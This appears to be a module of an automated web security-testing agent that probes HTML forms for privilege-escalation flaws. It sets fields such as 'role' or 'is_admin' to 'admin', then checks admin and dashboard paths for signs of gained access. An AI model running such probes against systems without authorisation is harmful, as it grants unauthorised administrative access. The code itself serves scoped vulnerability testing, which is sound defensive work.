from __future__ import annotations

from ravage.agent_core.agent_state import AgentState
from ravage.probes.specialists.shared import (
    _dedupe,
    _form_targets,
    _fresh_form_for_submission,
    _list_of_dicts,
    _string_items,
    _submit_form,
    _surface_endpoints,
    _target_brief,
    _target_headers,
)
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, form_defaults, response_secrets
from ravage.web_core.proof_recognizer import recognize_proofs


def _probe_privilege_escalation(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for form, field_name in _privilege_forms(state):
        if budget <= 0:
            break
        auth_headers = _target_headers({"form": form})
        submission_form = _fresh_form_for_submission(session, form, headers=auth_headers or None)
        fields = _escalated_form_fields(submission_form, field_name)
        submitted = _submit_form(session, submission_form, fields, headers=auth_headers or None)
        budget -= 1
        requests.append(
            submitted.summary(body_chars=260)
            | {
                "probe_kind": "privilege_escalation_submit",
                "form": _target_brief(
                    {
                        "kind": "form",
                        "url": submission_form.get("action"),
                        "input": field_name,
                        "hints": submission_form.get("categories"),
                        "form": submission_form,
                    }
                ),
                "privilege_field": field_name,
                "privilege_value": fields.get(field_name, ""),
                "authenticated": bool(auth_headers),
            }
        )
        proofs = recognize_proofs(submitted.body)
        if proofs:
            findings.append(
                _privilege_finding(
                    submission_form, field_name, fields, submitted, proofs, [], "form_response"
                )
            )
            continue
        for url in _restricted_access_urls(session, state):
            if budget <= 0:
                break
            response = session.get(url, headers=auth_headers or None)
            budget -= 1
            requests.append(
                response.summary(body_chars=260)
                | {
                    "probe_kind": "post_escalation_restricted_access",
                    "authenticated": bool(auth_headers),
                }
            )
            proofs = recognize_proofs(response.body)
            matches = response_secrets(response)
            if proofs or matches or _restricted_access_signal(response):
                findings.append(
                    _privilege_finding(
                        submission_form, field_name, fields, response, proofs, matches, url
                    )
                )
                break
    return findings, requests, budget


def _privilege_forms(state: AgentState) -> list[tuple[dict[str, object], str]]:
    targets: list[tuple[dict[str, object], str]] = []
    for form in _form_targets(state, limit=12):
        for input_field in _list_of_dicts(form.get("inputs")):
            name = str(input_field.get("name") or "")
            if _looks_like_privilege_field(name):
                targets.append((form, name))
                break
    return targets[:6]


def _looks_like_privilege_field(name: str) -> bool:
    lowered = name.lower()
    return _contains_marker(
        lowered,
        (
            "is_admin",
            "admin",
            "superuser",
            "is_staff",
            "staff",
            "role",
            "privilege",
            "permission",
            "access_level",
            "level",
            "premium",
            "plan",
            "tier",
        ),
    )


def _escalated_form_fields(form: dict[str, object], field_name: str) -> dict[str, str]:
    fields = form_defaults(form)
    lowered = field_name.lower()
    if "role" in lowered:
        fields[field_name] = "admin"
    elif "permission" in lowered or "privilege" in lowered:
        fields[field_name] = "admin"
    else:
        fields[field_name] = "1"
    return fields


def _restricted_access_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls: list[str] = []
    for endpoint in _surface_endpoints(state):
        if _looks_restricted_endpoint(endpoint):
            urls.append(endpoint)
    for path in (
        "/admin",
        "/admin/",
        "/dashboard",
        "/profile",
        "/account",
        "/settings",
        "/private",
    ):
        urls.append(session.absolute(path))
    scoped_urls: list[str] = []
    for url in urls:
        if session.in_scope(url):
            scoped_urls.append(url)
    return _dedupe(scoped_urls)[:12]


def _looks_restricted_endpoint(url: str) -> bool:
    lowered = url.lower()
    return _contains_marker(
        lowered,
        (
            "admin",
            "dashboard",
            "profile",
            "account",
            "settings",
            "private",
            "manage",
            "user",
            "role",
            "company",
            "jobs",
        ),
    )


def _restricted_access_signal(response: ProbeResponse) -> dict[str, object]:
    if response.status not in {200, 201, 202, 204, 206, 302, 303}:
        return {}
    lowered = response.body.lower()
    if "<form" in lowered and "password" in lowered:
        return {}
    markers = [
        marker
        for marker in ("logout", "dashboard", "profile", "settings", "private", "welcome")
        if marker in lowered
    ]
    if markers:
        return {"kind": "restricted_marker_after_privilege_submit", "markers": markers[:8]}
    return {}


def _contains_marker(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False


def _privilege_finding(
    form: dict[str, object],
    field_name: str,
    fields: dict[str, str],
    response: ProbeResponse,
    proofs: list[str],
    matches: list[str],
    source: str,
) -> dict[str, object]:
    replay: dict[str, object] = {
        "method": str(form.get("method") or "GET").upper(),
        "url": str(form.get("action") or ""),
        "form": fields,
        "privilege_field": field_name,
        "encoding": "application/x-www-form-urlencoded",
    }
    auth_headers = _target_headers({"form": form})
    if auth_headers:
        replay["headers"] = auth_headers
    return {
        "type": "vertical_idor_privilege_field",
        "field": field_name,
        "form": {
            "method": str(form.get("method") or "GET").upper(),
            "action": str(form.get("action") or ""),
            "categories": _string_items(form.get("categories")),
        },
        "submitted_value": fields.get(field_name, ""),
        "proofs": proofs,
        "matches": matches,
        "source": source,
        "response": response.summary(body_chars=700),
        "replay": replay,
    }
